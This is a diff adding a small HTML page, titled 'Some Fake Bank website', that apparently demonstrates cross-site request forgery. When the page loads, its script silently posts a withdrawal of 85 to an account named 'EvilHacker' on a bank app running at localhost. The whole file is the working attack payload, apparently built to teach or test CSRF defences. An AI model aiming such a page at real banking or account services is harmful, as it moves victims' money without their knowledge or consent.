@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Some Fake Bank website</title>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://localhost:44386/Home/Withdraw', true);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.onload = function () {
+            console.log(this.responseText);
+        };
+        xhr.send("ToAccountName=EvilHacker&Amount=85");
+    </script>
+</head>
+<body>
+</body>
+</html>
